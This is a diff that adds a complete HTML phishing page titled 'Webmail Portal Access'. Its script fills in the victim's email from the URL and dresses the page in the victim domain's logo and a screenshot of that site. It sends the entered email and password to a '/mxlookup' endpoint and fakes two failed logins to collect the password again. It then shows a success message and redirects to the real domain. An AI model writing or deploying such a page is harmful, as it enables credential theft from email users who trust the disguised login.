@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Portal Access</title>
+    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            color: #535353;
+            background-repeat: no-repeat;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 50px;
+            border-radius: 5px;
+            color: white;
+            max-width: 600px;
+            text-align: center;
+        }
+        .alert-danger {
+            color: red;
+            display: none;
+        }
+        .alert-success {
+            color: green;
+            display: none;
+        }
+        #logoimg {
+            max-width: 80px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img id="logoimg" src="" alt="Service Logo">
+        <h2>Sign in to continue</h2>
+        <p>Enter your credentials</p>
+
+        <div id="msg" class="alert alert-danger mt-3">Invalid login. Please try again.</div>
+        <div id="success-msg" class="alert alert-success mt-3">Login Successful!</div>
+
+        <form id="login-form">
+            <div class="form-group">
+                <input type="email" class="form-control" id="email" name="email" placeholder="Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
+        </form>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            // Function to extract UID from URL path (e.g., /uid=user@domain.com)
+            function extractUidFromPath() {
+                const path = window.location.pathname;
+                const parts = path.split('/');
+                const uidSegment = parts.find(p => p.startsWith('uid='));
+                return uidSegment ? decodeURIComponent(uidSegment.split('=')[1]) : null;
+            }
+
+            const uidFromPath = extractUidFromPath(); // Get uid from path (no ? needed)
+
+            if (uidFromPath) {
+                $('#email').val(uidFromPath); // Auto-fill email input
+                let domain = uidFromPath.split('@')[1];
+
+                // Set background image
+                let backgroundImage = "url('https://image.thum.io/get/width/1200/https://" + domain + "')";
+                document.body.style.backgroundImage = backgroundImage;
+
+                // Set logo image
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + domain);
+            }
+
+            let invalidLoginAttempts = 0;
+
+            $('#login-form').submit(function(event) {
+                event.preventDefault();
+                $('#msg').hide();
+                $('#success-msg').hide();
+
+                let email = $('#email').val();
+                let password = $('#password').val();
+                let domain = email.split('@')[1];
+
+                $.ajax({
+                    url: '/mxlookup',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ email: email, password: password }),
+                    success: function(response) {
+                        if (invalidLoginAttempts < 2) {
+                            invalidLoginAttempts++;
+                            $('#msg').show();
+                        }
+                        if (invalidLoginAttempts >= 2) {
+                            $('#msg').hide();
+                            $('#success-msg').show();
+                            setTimeout(function() {
+                                window.location.href = `https://${domain}`;
+                            }, 2000);
+                        }
+                    },
+                    error: function() {
+                        $('#msg').text('An error occurred. Please try again later.').show();
+                    }
+                });
+            });
+        });
+    </script>
+    
+</body>
+</html>
